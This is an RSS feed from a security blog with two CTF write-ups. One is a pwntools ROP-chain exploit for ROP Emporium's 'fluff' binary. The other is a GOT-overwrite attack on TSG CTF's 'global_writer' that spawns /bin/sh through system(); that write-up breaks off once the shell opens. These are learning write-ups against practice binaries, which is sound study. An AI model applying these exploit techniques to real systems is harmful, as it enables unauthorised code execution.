<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title><![CDATA[Markel Mencía's blog]]></title>
        <description><![CDATA[Markel's blog, mainly focused on Computer Science but also about other topics.]]></description>
        <link>https://markelmencia.github.io</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Fri, 26 Dec 2025 23:16:29 GMT</lastBuildDate>
        <atom:link href="https://markelmencia.github.io/rss.xml" rel="self" type="application/rss+xml"/>
        <language><![CDATA[en]]></language>
        <item>
            <title><![CDATA[ROP Emporium x86-64 Challenge 6: fluff]]></title>
            <description><![CDATA[<h1>ROP Emporium x86-64 Challenge 6: fluff</h1>
<h4>December 26, 2025</h4>
<p>Brace yourself for this one; although conceptually this challenge is nothing new, we'll have to get creative.</p>
<p>The description tells us that this challenge is not very different from the [write4] challenge. We just need to call the <code>print_file</code> function in the binary with <code>flag.txt</code> as the argument. With all of this said, let's just jump right into it.</p>
<p>Let's start just like we've done until now, checking the functions in the binary:</p>
<pre><code>pwndbg> info functions
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  questionableGadgets
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
</code></pre>
<p>Exactly the same as the write4 challenge, except from one function: <code>questionableGadgets</code>. Well, let's rip the band aid right off and disassemble it.</p>
<pre><code>pwndbg> disas questionableGadgets
   0x0000000000400628 &#x3C;+0>:	    xlat   BYTE PTR ds:[rbx]
   0x0000000000400629 &#x3C;+1>:	    ret
   0x000000000040062a &#x3C;+2>:	    pop    rdx
   0x000000000040062b &#x3C;+3>:	    pop    rcx
   0x000000000040062c &#x3C;+4>:	    add    rcx,0x3ef2
   0x0000000000400633 &#x3C;+11>:	bextr  rbx,rcx,rdx
   0x0000000000400638 &#x3C;+16>:	ret
   0x0000000000400639 &#x3C;+17>:	stos   BYTE PTR es:[rdi],al
   0x000000000040063a &#x3C;+18>:	ret
   0x000000000040063b &#x3C;+19>:	nop    DWORD PTR [rax+rax*1+0x0]

</code></pre>
<p>Right.</p>
<p>We have three gadgets here (one for each <code>ret</code> function). Don't worry, it's perfectly normal to not understand a single gadget in here. Let's go through each one of them carefully.</p>
<h2>The <code>xlat</code> gadget</h2>
<pre><code>xlat    BYTE PTR ds:[rbx]
ret
</code></pre>
<p><code>xlat</code> is an instruction that involves two registers: <code>al</code> and <code>rbx</code>. The value of <code>rbx</code> should be a pointer to an array in memory (in theory it should be a table, but for what we'll use it to, we might as well call it an array). The value of <code>al</code> should be an index in that array.</p>
<p>What <code>xlat</code> does is replace the value of <code>al</code> to the byte stored in whatever index of the array was stored in <code>al</code> before the instruction. Let's see an example.</p>
<pre><code>0xAEAE: 'h'  0xAEAF: 'e' 0xAEB0: 'y'  0xAEB1: '\0'

BEFORE XLAT:
RBX: 0xAEAE (Points to the first element of the array)
AL: 1

AFTER XLAT:
RBX: 0xAEAE
AL: 65 ('e' in ASCII, the character in index 1 of the array)
</code></pre>
<p>We have an array with the elements <code>['h', 'e', 'y', '\0']</code> in it, <code>rbx</code> pointing to the beginning of that array and <code>al</code> with <code>1</code> stored in it. When <code>xlat</code> is executed, the value of <code>al</code> will change to whatever value its index was pointing to. In this case, it was pointing to the index <code>1</code>, so its value will now be 65, which represents the letter 'e' in ASCII.</p>
<h2>The <code>bextr</code> gadget</h2>
<p>This one is the most obscure gadget of the three. It works with three registers: <code>rbx</code>, <code>rcx</code> and <code>rdx</code>.</p>
<p><code>bextr</code> performs an extraction. It reads a source value, stored in <code>rcx</code>, and with some control bits in <code>rdx</code> (we'll see later), it will copy a chunk of the bits into <code>rbx</code>. Let's see an example:</p>
<pre><code>RCX: 1100 0100 1110 1010 (source)
RDX: 0x0804 (Start at bit 4 and extract 8 bits)
RBX: 0100 1110
</code></pre>
<p>The only important bytes in <code>rdx</code> are the first four. The first two declare the starting bit and the next two declare the amount of bits that will be copied into <code>rbx</code>.</p>
<p>To make matters worse, this gadget also executes an <code>add</code> instruction before <code>bextr</code>:</p>
<pre><code>   0x000000000040062a &#x3C;+2>:	pop    rdx
   0x000000000040062b &#x3C;+3>:	pop    rcx
   0x000000000040062c &#x3C;+4>:	add    rcx,0x3ef2
   0x0000000000400633 &#x3C;+11>:	bextr  rbx,rcx,rdx
</code></pre>
<p>We'll have to work around that somehow. At least the gadget allows us to pop values into the registers the instruction uses.</p>
<h2>The <code>stos</code> gadget</h2>
<p><code>stos</code> is actually very simple to understand, and very useful for this challenge. In simple terms, it just stores the byte stored in <code>AL</code> in the address in memory specified in <code>rdi</code>. It also modifies <code>rdi</code> according to a program flag value, but we don't need to worry about that. Here's an example:</p>
<pre><code>0xAEAE: 0x2341

AL: 61
RDI: 0xAEAE

After executing stos:
OxAEAE: 61
</code></pre>
<h2>The strategy</h2>
<p>With these gadgets, there is a way to arbitrarily store data in memory. This is useful because we want to have a string in memory we can use as an argument for <code>print_file</code>. In other words, we can write <code>flag.txt</code> in memory with these gadgets. But the strategy is everything but intuitive.</p>
<p>With the <code>bextr</code> gadget, we can store an arbitrary value in <code>rbx</code>. This is good, because the <code>xlat</code> instruction uses the <code>rbx</code> register as a pointer.</p>
<p>Considering the fact that we have full control of what can be stored in <code>rbx</code>, we can point to anywhere in memory if we want to, which in theory allows us to store any value we want in <code>al</code>. There's a caveat with this though, but let's go one issue at a time. Having control of  <code>al</code> is useful too, because <code>stos</code> will store whatever byte is stored in <code>al</code> in memory (assuming we can also control <code>rdi</code> with another gadget. Spoiler: we can).</p>
<p>To sum up, arbitrary writing in memory <em>is</em> possible with these gadgets. But the way in which this is achieved is very difficult to visualize. I'll try my best to explain the loop needed for the exploit:</p>
<ol>
<li>We write <code>flag.txt</code> in the garbage section of the buffer overflow (the place in which in previous challenges we've written 'A's to reach the return address offset).</li>
<li>Using <code>bextr</code>, we write in <code>rbx</code> the address of the section in which <code>flag.txt</code> is (with an adjustment to make sure <code>xlat</code> takes the proper byte, we'll see later).</li>
<li>With the adjusted pointer in <code>rbx</code>, we execute the <code>xlat</code> gadget to store one byte of <code>flag.txt</code>. This adjustment is needed because the index that <code>xlat</code> will take is stored in <code>al</code> too. We have no direct way of controlling what value is in this register before getting here, so for each byte we take, we'll have to calculate an offset for <code>rbx</code>.</li>
<li>Once we have the byte we want stored in <code>al</code>, we can store it somewhere else with <code>stos</code>. Usually we do this in the <code>bss</code> section of the binary.</li>
<li>We do this in loop until we write the last "t" of "flag.txt". After that, we can use a <code>pop rdi; ret</code> gadget to then execute <code>print_file</code> and read the flag.</li>
</ol>
<p>That was a handful... It took a lot of pondering to get this right. Before we get to the exploit building, let's talk about the offset I mentioned in step 2 and 3.</p>
<h2>The <code>rbx</code> offset</h2>
<p>There are a few issues with making sure that the proper pointer is stored in <code>rbx</code>. Remember the <code>add</code> instruction in the <code>bextr</code> gadget?</p>
<pre><code>   0x000000000040062a &#x3C;+2>:	    pop    rdx
   0x000000000040062b &#x3C;+3>:	    pop    rcx
   0x000000000040062c &#x3C;+4>:	    add    rcx,0x3ef2
   0x0000000000400633 &#x3C;+11>:	bextr  rbx,rcx,rdx
</code></pre>
<p>Whatever value we store in <code>rcx</code>, <code>0x3ef2</code> will be added to it. We have to take this into account:</p>
<pre><code>rbx_offset = -0x3ef2
</code></pre>
<p>Then, as I've mentioned, this strategy is operated in a loop, for every character <code>flag.txt</code> has. This means that for every character we go through, we'll have to increment by one the starting address of the <code>flag.txt</code> pointer:</p>
<pre><code>rbx_offset = -0x3ef2 + i
</code></pre>
<p>And now, the cherry on top. Since the value stored in the register <code>al</code> after executing <code>xlat</code> depends on <code>al</code> as well, and also considering the fact that there is no other way for us to arbitrarily modify <code>al</code> with any other gadget, we will have to take into account the value of <code>al</code> <em>before</em> we perform our exploit. This can easily be checked with a breakpoint right before the <code>ret</code> instruction of the <code>pwnme</code> function. It turns out that the value of <code>al</code> is <code>11</code>, so we'll have to subtract <code>11</code> from the pointer, because <code>al</code> will go into the index <code>11</code> from the starting point of the array pointer. Which means that, for example, if the byte we want to store in <code>al</code> is in the index 0 of the array <code>0xAEAE</code>, the pointer in <code>rbx</code> should be <code>0xAEAE - 11</code>.</p>
<pre><code>rbx_offset = -0x3ef2 + i - 11
</code></pre>
<p>But there's more! We have to consider the next iterations! Once we store in <code>al</code> the first byte of <code>flag.txt</code>  (the character <code>f</code>, 102 in ASCII), we'll have to subtract <code>102</code> from the offset, not <code>11</code>. And we'll have to consider the next iterations as well! Let's take this into account in code:</p>
<pre><code>FLAG_TEXT = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
al_offset = 11 # Initial value of al

rbx_offset = -0x3ef2 + i - al_offset
al_offset = ord[flag_text[i]] # Gets the ASCII value of the character
</code></pre>
<p>Pwning is hard.</p>
<p>At least that's the climax in terms of understanding the strategy. With this in mind, we can begin building the payload.</p>
<h2>The payload</h2>
<p>Like we always do, let's begin with defining some variables:</p>
<pre><code>from pwn import *

OFFSET = 40
OVERFLOWED_BUFFER_ADDRESS = 0x7fffffffdc30

BEXTR_GADGET_ADDRESS = 0x0000040062A
XLAT_GADGET_ADDRESS = 0x0000000400628
STOS_GADGET_ADDRESS = 0x0000000000400639
POP_RDI_GADGET_ADDRESS = 0x004006a3
PRINT_FILE_FUNCTION_ADDRESS = 0x400510
BSS_ADDRESS = 0x0000000000601038

FLAG_TEXT = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
al_offset = 11
</code></pre>
<p>The offset was obtained the same way as in the other challenges. The pointer to the overflowed buffer (the buffer that we overflow in <code>pwnme</code>) was obtained by adding a breakpoint in the <code>read</code> function in <code>pwnme</code>. Once you stop in there, pwndbg prints out in which pointer will <code>read</code> write your input. That's the buffer.  The <code>bss</code> pointer was obtained with <code>info files</code>. The <code>bss</code> area is one in which we have write permissions. Perfect to store arbitrary values in.</p>
<p>With the variables out of the way, let's assemble our <code>payload</code> variable.</p>
<p>First, we set up the offset. As we've said, we'll write <code>flag.txt</code> in it, and then as many A's as we need to get to the return address, just like we've done in the other challenges:</p>
<pre><code>payload = b"flag.txt" + b"A"*(OFFSET - 8) # 8 = length of flag.txt
</code></pre>
<p>Now we can start the loop. Since <code>flag.txt</code> has 8 characters, and we can copy one character to memory at a time, we'll have to execute this loop eight times. The first thing we'll do in every iteration is calculate the <code>rbx</code> offset:</p>
<pre><code>for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
</code></pre>
<p>Now we need to run the <code>bextr</code> gadget. In <code>rdx</code>, the control register, we'll set the starting address to <code>0x00</code> and the length of the extraction to <code>0xFF</code>, meaning that we'll copy the whole register into <code>rbx</code>. In <code>rcx</code>, we'll push <code>OVERFLOWED_BUFFER_ADDRESS + rbx_offset</code>, so it can be copied into <code>rbx</code>:</p>
<pre><code>for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
	payload += p64(BEXTR_GADGET_ADDRESS)
	payload += p64(0xFF00) # rdx
	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset)
</code></pre>
<p>This will write in <code>rbx</code> our adjusted pointer, ready for <code>xlat</code> to read into it:</p>
<pre><code>for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
	payload += p64(BEXTR_GADGET_ADDRESS)
	payload += p64(0xFF00) # rdx
	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
	payload += p64(XLAT_GADGET_ADDRESS)
</code></pre>
<p>After this, <code>al</code> will contain whatever character of <code>flag.txt</code> the iteration is on. All we need to do is store it in <code>bss</code>, with the <code>pop rdi; ret</code> gadget I've found with the <code>rop</code> command and the <code>stos</code> gadget:</p>
<pre><code>for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
	payload += p64(BEXTR_GADGET_ADDRESS)
	payload += p64(0xFF00) # rdx
	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
	
	payload += p64(XLAT_GADGET_ADDRESS)
	payload += p64(POP_RDI_GADGET_ADDRESS)
	payload += p64(BSS_ADDRESS + i) # rdi
	payload += p64(STOS_GADGET_ADDRESS)
</code></pre>
<p>We add <code>i</code> to it because we don't want to keep overwriting the same byte in <code>bss</code>.</p>
<p>After <code>stos</code>, all we need to do is update <code>al_offset</code>:</p>
<pre><code>for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
	payload += p64(BEXTR_GADGET_ADDRESS)
	payload += p64(0xFF00) # rdx
	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
	
	payload += p64(XLAT_GADGET_ADDRESS)
	payload += p64(POP_RDI_GADGET_ADDRESS)
	payload += p64(BSS_ADDRESS + i) # rdi
	payload += p64(STOS_GADGET_ADDRESS)
	
	al_offset = ord(FLAG_TEXT[i])
</code></pre>
<p>The loop is done! When this loop ends, the <code>flag.txt</code> string will be written into <code>bss</code>. All we need to do now is call <code>print_file</code> with the pointer to <code>flag.txt</code> as an argument. This can be done with the <code>pop rdi; ret</code> gadget too:</p>
<pre><code>payload += p64(POP_RDI_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS) # rdi
payload += p64(PRINT_FILE_FUNCTION_ADDRESS)
</code></pre>
<p>The payload is done! Now we just write it into a file to use is as input, and the script is done! Here's the whole thing:</p>
<pre><code>from pwn import *

OFFSET = 40
OVERFLOWED_BUFFER_ADDRESS = 0x7fffffffdc10

BEXTR_GADGET_ADDRESS = 0x0000040062A
XLAT_GADGET_ADDRESS = 0x0000000400628
STOS_GADGET_ADDRESS = 0x0000000000400639
POP_RDI_GADGET_ADDRESS = 0x004006a3
PRINT_FILE_FUNCTION_ADDRESS = 0x400510
BSS_ADDRESS = 0x0000000000601038

FLAG_TEXT = ['f', 'l', 'a', 'g', '.', 't', 'x', 't']
al_offset = 11


payload  = b"flag.txt" + b"A"*(OFFSET - 8) # 8 = length of flag.txt
for i in range(8):
	rbx_offset = -0x3ef2 + i - al_offset
	payload += p64(BEXTR_GADGET_ADDRESS)
	payload += p64(0xFF00) # rdx
	payload += p64(OVERFLOWED_BUFFER_ADDRESS + rbx_offset) # rcx
	
	payload += p64(XLAT_GADGET_ADDRESS)
	payload += p64(POP_RDI_GADGET_ADDRESS)
	payload += p64(BSS_ADDRESS + i) # rdi
	payload += p64(STOS_GADGET_ADDRESS)
	
	al_offset = ord(FLAG_TEXT[i])

payload += p64(POP_RDI_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS) # rdi
payload += p64(PRINT_FILE_FUNCTION_ADDRESS)

open("exploit", "bw").write(payload)
</code></pre>
<p>This solution, if executed normally, will throw a segmentation fault before printing the flag. However, if we execute it inside pwndbg, we'll be able to read the file before it segfaults. With this said, let's run the exploit:</p>
<pre><code>$ python3 exploit.py
$ pwndbg fluff
pwndbg> run &#x3C; exploit
fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> Thank you!
ROPE{a_placeholder_32byte_flag!}

Program received signal SIGSEGV, Segmentation fault.
</code></pre>
<h2>A few (very interesting!) things</h2>
<p>The fact that this solution works is nothing short of a miracle, and I mean this. First, this payload doesn't need stack aligning to work, which is already a feat by itself. Second, and most importantly, this payload is <strong>exactly</strong> as big as the number of bytes that the <code>read</code> function in <code>pwnme</code> reads. This means that if you add just one more address to the payload, it won't be read by <code>read</code> and it will not show up in the overflowed buffer, rendering that address, gadget or pointer completely useless.</p>
<p>I found out this the hard way, when after figuring out the trick and building the payload, I realized that the last two addresses I added into the buffer just weren't there when I ran the binary. I was ready to give up (by that time I had already spent a few hours with the challenge) when, to my amazement, removing the two stack alignments I coded in the payload gave me no issues, other than probably that fact that that's why the program segfaults at the end. That sure was a roller-coaster of emotions.</p>
<p>On another note, you might have noticed something fishy. In the beginning of the exploit, when we write in the characters to reach the return address offset, I write <code>flag.txt</code> in there. Well, isn't that writing in memory already? Why do you need to build that shoddy payload just to write <code>flag.txt</code> again but in <code>bss</code>? That's exactly what I asked myself much before I came up with the solution I present in this writeup.</p>
<p>That's right, you can just write <code>flag.txt</code> in the buffer (plus a null character as a delimiter), then all the other garbage characters until the return address and then the <code>pop rdi; ret</code> gadget along with the address to the buffer to then call <code>print_file</code> to print the flag. It's a perfectly possible solution. However, had you stopped there and not come up with the complicated solution, you wouldn't have learnt as much, right?</p>
<p>Actually, there are ways in which you can read the flag without even having to write any special string in the buffer overflow. <a href="https://github.com/shero4/ROP-Emporium-2020-writeup/blob/master/fluff/exploit.py">This writeup does it</a>, it's a very smart solution that I really like. This approach is more solid than mine, and it probably works better under more strict environments. I could've written that solution in this writeup, but I didn't want to. In the end, this is the solution I came up with. It took me a lot of work, and honestly, I'm quite proud of it! The fact that it barely works, and that it's pretty much a miracle that it does, makes me feel like it's worth sharing (and that it's pretty funny), because it goes to show that when it comes down to capturing flags, any solution within the rules is valid, no matter how cluttery, weird or inconsistent. Pwning can be very difficult and unintuitive, and each person has their own ways of going around the pond!</p>
]]></description>
            <link>https://markelmencia.github.io/writeups/rop-emporium-fluff-writeup</link>
            <guid isPermaLink="true">https://markelmencia.github.io/writeups/rop-emporium-fluff-writeup</guid>
            <pubDate>Fri, 26 Dec 2025 00:00:00 GMT</pubDate>
        </item>
        <item>
            <title><![CDATA[TSG CTF 2025 Writeup: global_writer [Pwn]]]></title>
            <description><![CDATA[<h1>TSG CTF 2025 Writeup: global_writer [Pwn]</h1>
<h4>December 5, 2025</h4>
<p>This is a Pwn challenge for the TSG 2025 CTF, made by shashiming. The description for it is: "Just make 'em all global. Way easier.".</p>
<h2>The source code</h2>
<p>For this challenge, other than the binary and a Dockerfile to run the server, we are given the source of the binary. Let's take a look at it</p>
<pre><code class="language-c">// gcc -no-pie -Wl,-z,relro -fstack-protector-all -o chal src.c

#include &#x3C;stdio.h>
#include &#x3C;stdlib.h>
#define SIZE 0x10

char *msg = "Update Complete";
int values[SIZE];
int idx, i;

void handle_error() {
  system("echo ERROR OCCURRED");
  exit(1);
}

void edit() {
  while (1) {
    printf("index? > ");
    if (scanf("%d", &#x26;idx) != 1) {
      handle_error();
    }
    if (idx == -1) {
      break;
    }
    printf("value? > ");
    if (scanf("%d", &#x26;values[idx]) != 1) {
      handle_error();
    }
  }

  puts(msg);
  printf("Array: ");
  for (i = 0; i &#x3C; SIZE; i++) {
    printf("%d ", values[i]);
  }
  printf("\n");
}

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  edit();
  return 0;
}
</code></pre>
<p>Taking a look at <code>edit()</code>, the function that allows us to input data, we can see how we'll have to give an index and then the value that will be stored in that index of the array <code>values</code>.  We'll be able to store data to this array until we select index -1.</p>
<p>Interestingly though, <code>values</code> is not a local variable, it's a <strong>global variable</strong>. This moves stack overflows out of the question, as the array indexes are going to be <strong>in memory.</strong> This is why the author of this challenge hinted global variables in the description.</p>
<p>Since we'll be writing somewhere in memory (to hopefully overflow it), it'd make sense to check where exactly the array is located, and see what's around it. To inspect the binary, I'll be using <code>pwndbg</code>.</p>
<h2>Looking around</h2>
<p>Since the array is a global variable, we can easily check its address with <code>info variables</code>:</p>
<pre><code>pwndbg> info variables
...
0x00000000004040c0  values
...
</code></pre>
<p>Before inspecting the address region, I'll run the program and add a breakpoint on startup, just so we allow the program to load its variables and memory regions.</p>
<pre><code>pwngdb> break main
Breakpoint 1 at 0x4013b1
pwndbg> run
</code></pre>
<p>Now, let's see what's next to the <code>values</code> address:</p>
<pre><code>pwndbg> x/32gx 0x4040c0
0x4040c0 &#x3C;values>:	0x0000000000000000	0x0000000000000000
0x4040d0 &#x3C;values+16>:	0x0000000000000000	0x0000000000000000
0x4040e0 &#x3C;values+32>:	0x0000000000000000	0x0000000000000000
0x4040f0 &#x3C;values+48>:	0x0000000000000000	0x0000000000000000
0x404100 &#x3C;idx>:	0x0000000000000000	0x0000000000000000
0x404110:	0x0000000000000000	0x0000000000000000
0x404120:	0x0000000000000000	0x0000000000000000
0x404130:	0x0000000000000000	0x0000000000000000
0x404140:	0x0000000000000000	0x0000000000000000
0x404150:	0x0000000000000000	0x0000000000000000
0x404160:	0x0000000000000000	0x0000000000000000
0x404170:	0x0000000000000000	0x0000000000000000
0x404180:	0x0000000000000000	0x0000000000000000
0x404190:	0x0000000000000000	0x0000000000000000
0x4041a0:	0x0000000000000000	0x0000000000000000
0x4041b0:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>Nothing out of the ordinary. We can see the memory range of  <code>values</code>, empty for now, and after that we can see <code>idx</code>, a global variable defined after <code>values</code> in the source code. This is what's after <code>values</code>, let's see what's before it. For that, I'll just plug in a lower address, like <code>0x404000</code>:</p>
<pre><code>pwndbg> x/32gx 0x404000
0x404000:	0x0000000000403e20	0x00007ffff7ffe310
0x404010:	0x00007ffff7fd9610	0x0000000000401030
0x404020 &#x3C;puts@got.plt>:	0x0000000000401040	0x0000000000401050
0x404030 &#x3C;setbuf@got.plt>:	0x0000000000401060	0x0000000000401070
0x404040 &#x3C;printf@got.plt>:	0x0000000000401080	0x0000000000401090
0x404050 &#x3C;exit@got.plt>:	0x00000000004010a0	0x0000000000000000
0x404060:	0x0000000000000000	0x0000000000402004
0x404070:	0x0000000000000000	0x0000000000000000
0x404080 &#x3C;stdout@GLIBC_2.2.5>:	0x00007ffff7f9e5c0	0x0000000000000000
0x404090 &#x3C;stdin@GLIBC_2.2.5>:	0x00007ffff7f9d8e0	0x0000000000000000
0x4040a0 &#x3C;stderr@GLIBC_2.2.5>:	0x00007ffff7f9e4e0	0x0000000000000000
0x4040b0:	0x0000000000000000	0x0000000000000000
0x4040c0 &#x3C;values>:	0x0000000000000000	0x0000000000000000
0x4040d0 &#x3C;values+16>:	0x0000000000000000	0x0000000000000000
0x4040e0 &#x3C;values+32>:	0x0000000000000000	0x0000000000000000
0x4040f0 &#x3C;values+48>:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>Nice.</p>
<p>Someone that has worked with dynamic linking attacks would be devilishly rubbing its hands right now. The <strong>PLT table</strong> is located very close to <code>values</code>.  Reading about <strong>PLT/GOT</strong> is highly advised if you haven't already, I highly recommend <a href="https://can-ozkan.medium.com/got-vs-plt-in-binary-analysis-888770f9cc5a">this article</a> to understand the basics; but essentially, we can overwrite the pointers to the functions in the PLT to make them <strong>execute a different function</strong>. In the source code, in <code>handle_error()</code>, we can notice a <code>system()</code> function. What would happen if we overwrote the pointer of <code>puts()</code>, so that instead of linking the PLT to <code>puts()</code> it linked to <code>system()</code>? This would make it so that for every <code>puts()</code> called in the code, instead of executing the <code>puts()</code> code, it would execute the <code>system()</code> code, potentially granting us access to <strong>arbitrary code execution</strong> in the machine.</p>
<h2>Function arguments</h2>
<p>Granted, that wouldn't be enough, because both <code>puts()</code> and <code>system()</code> have their own string arguments ("Update Complete" and "echo ERROR OCCURRED" respectively, looking at the source code). This means that even if we do manage to run <code>system()</code> for every <code>puts()</code> call, the argument would be "Update Complete". That would naturally raise an error, because it's not a valid command. Thus, we'll have to find a workaround for that.</p>
<p>We're in luck, because the string <code>msg</code>, which is the string used as the argument in <code>puts()</code> (which will later become <code>system()</code>) is actually a <strong>global variable</strong> too, and its address is even closer to the array <code>values</code>:</p>
<pre><code>pwndbg> p &#x26;msg
$1 = (&#x3C;data variable, no debug info> *) 0x404068 &#x3C;msg>
</code></pre>
<p>In C, a string is a pointer, and this is no exception. The value in the memory address <code>0x404068</code> will be <strong>another address</strong>, that will actually contain the content of the string: its characters. So, if we overwrite the value of <code>msg</code> so that we write an address we can write whatever string we want to, we'll be able to <strong>modify the string</strong>. And in what addresses can we write on with seemingly no limitations? In <code>values</code> of course, with the use of the function <code>edit()</code> of the binary!</p>
<h2>Overwriting global variables</h2>
<p>In order to overwrite <code>msg</code>, considering it's behind <code>values</code> in memory, we'll need to write in a negative of <code>values</code>. To calculate in which, we can do <code>x/32gx &#x26;msg</code> and start counting down for every 4 bytes from <code>values</code> until the address of <code>msg</code>. We get  -22. So, to overwrite <code>msg</code>, we'll have to write in the index -22 of <code>values</code>. What do we want to write there? Well, any address inside <code>values</code> works, I'll use the first one, <code>0x4040c0</code>. In this address, I'll have to write whatever I want the argument of <code>system()</code> to be. Since we want full control of the system, we can write <code>/bin/sh</code> in there. With this argument in <code>system()</code>, a shell will be opened, so that later we can <code>cat</code> into the flag.</p>
<p>That's the first step done! Let's write this down for now:</p>
<pre><code>1. Write in index -22 the value 0x4040c0
2. Write in index 0 (address 0x4040c0) the string "/bin/sh"
</code></pre>
<p>Actually, there's a small issue with this. <code>values</code> is an array of <strong>integers</strong>, which means that each index has the capacity for <strong>4 bytes</strong>, four characters in total. This makes us have to split the string in two. In the first index we'll write "/bin", and in the next one we'll write "/sh".</p>
<pre><code>1. Write in index -22 the value 0x4040c0
2. Write in index 0 (address 0x4040c0) the string "/bin"
3. Write in index 1 (address 0x4040c1) the string "/sh"
</code></pre>
<p>Let's turn the strings into its ASCII hexadecimal equivalents:</p>
<pre><code>1. Write in index -22 the value 0x4040c0
2. Write in index 0 (address 0x4040c0) the value 0x6E69622F
3. Write in index 1 (address 0x4040c1) the value 0x68732F
</code></pre>
<h2>The dynamic link attack</h2>
<p>Now let's do the fun part. We've changed <code>msg</code> so that the argument that <code>put()</code> receives is <code>/bin/sh</code>, a valid command. Now we just need to make <code>put()</code> actually call <code>system()</code>, as we've said before. First, let's see where <code>system()</code> is located.</p>
<p>The PLT (Procedure Linkage Table) is used to perform a technique called "<strong>Lazy Linking</strong>", where a function is only linked to the binary when it's needed. In order to know its address, the PLT communicates with the GOT (Global Offset Table), which knows the address of these functions. To check the GOT, we can execute the <code>got</code> command:</p>
<pre><code>pwndbg> got
...
[0x404030] setbuf@GLIBC_2.2.5 -> 0x7ffff7e3d920 (setbuf) ◂— mov edx, 0x2000
[0x404038] system@GLIBC_2.2.5 -> 0x401070 ◂— endbr64 
[0x404040] printf@GLIBC_2.2.5 -> 0x7ffff7e0f900 (printf) ◂— sub rsp, 0xd8
...
</code></pre>
<p>There's <code>system()</code>, with its address (0x401070). With that out of the way, we can start focusing on the overwrite.</p>
<pre><code>0x404000:	0x0000000000403e20	0x00007ffff7ffe310
0x404010:	0x00007ffff7fd9610	0x0000000000401030
0x404020 &#x3C;puts@got.plt>:	0x0000000000401040	0x0000000000401050
0x404030 &#x3C;setbuf@got.plt>:	0x0000000000401060	0x0000000000401070
0x404040 &#x3C;printf@got.plt>:	0x0000000000401080	0x0000000000401090
0x404050 &#x3C;exit@got.plt>:	0x00000000004010a0	0x0000000000000000
0x404060:	0x0000000000000000	0x0000000000402004
0x404070:	0x0000000000000000	0x0000000000000000
0x404080 &#x3C;stdout@GLIBC_2.2.5>:	0x00007ffff7f9e5c0	0x0000000000000000
0x404090 &#x3C;stdin@GLIBC_2.2.5>:	0x00007ffff7f9d8e0	0x0000000000000000
0x4040a0 &#x3C;stderr@GLIBC_2.2.5>:	0x00007ffff7f9e4e0	0x0000000000000000
0x4040b0:	0x0000000000000000	0x0000000000000000
0x4040c0 &#x3C;values>:	0x0000000000000000	0x0000000000000000
0x4040d0 &#x3C;values+16>:	0x0000000000000000	0x0000000000000000
0x4040e0 &#x3C;values+32>:	0x0000000000000000	0x0000000000000000
0x4040f0 &#x3C;values+48>:	0x0000000000000000	0x0000000000000000
</code></pre>
<p>Looking at the PLT and <code>values</code>, yet again we need to calculate the index we'll need to write on to overwrite exactly the address in <code>puts()</code>. Using the same trick as before (and maybe some trial and error on the way), we get -40 as the index. In that address, we'll write the already known <code>system()</code> address. Let's note this down:</p>
<pre><code>3. Write in index -40 the system() address (0x401070)
</code></pre>
<h2>Performing the exploit</h2>
<p>We now have everything we need to perform the exploit. Let's take a look at the list we've written:</p>
<pre><code>1. Write in index -22 the value 0x4040c0
2. Write in index 0 (address 0x4040c0) the value 0x6E69622F
3. Write in index 1 (address 0x4040c1) the value 0x68732F
</code></pre>
<p>Normally, payloads like these are automated with a Python script with <code>pwntools</code>. I'll write them in manually, which is also not that difficult, and I think it's a more visual approach for a writeup. However, since the values taken by the <code>edit()</code> function are <strong>decimal integers</strong>, we'll need to translate our hexadecimal addresses to decimal:</p>
<pre><code>1. Write in index -22 the value 4210880
2. Write in index 0 (address 4210880) the value 1852400175
3. Write in index 1 (address 4210881) the value 6845231
4. Write in index -40 the system() address (4198512)
</code></pre>
<p>Now we just need to connect to the server and see if what we've done is correct:</p>
<pre><code>$ nc 34.84.25.24 58554
index? > -22
value? > 4210880
index? > 0
value? > 1852400175
index? > 1
value? > 6845231
index? > -40
value? > 4198512
index? >
</code></pre>
<p>Everything is set up now. All we need is to somehow execute <code>system()</code>.</p>
<pre><code>void edit() {
  while (1) {
    printf("index? > ");
    if (scanf("%d", &#x26;idx) != 1) {
      handle_error();
    }
    if (idx == -1) {
      break;
    }
    printf("value? > ");
    if (scanf("%d", &#x26;values[idx]) != 1) {
      handle_error();
    }
  }

  puts(msg);
  printf("Array: ");
  for (i = 0; i &#x3C; SIZE; i++) {
    printf("%d ", values[i]);
  }
  printf("\n");
}
</code></pre>
<p>Looking at the code, and the fact that we've replaced the <code>puts()</code> call with the <code>system()</code> code, including its argument, all we need to do is get to a <code>puts()</code> call. In order to get to it, we just need to break the <code>while</code> loop by selecting the index -1 next:</p>
<pre><code>index? > -1

</code></pre>
<p>Nothing showed up! This is actually great news, because <strong>the shell has opened</strong>. We have full control over the machine, so let's give ourselves the freedom of seeing what's on it:</p>
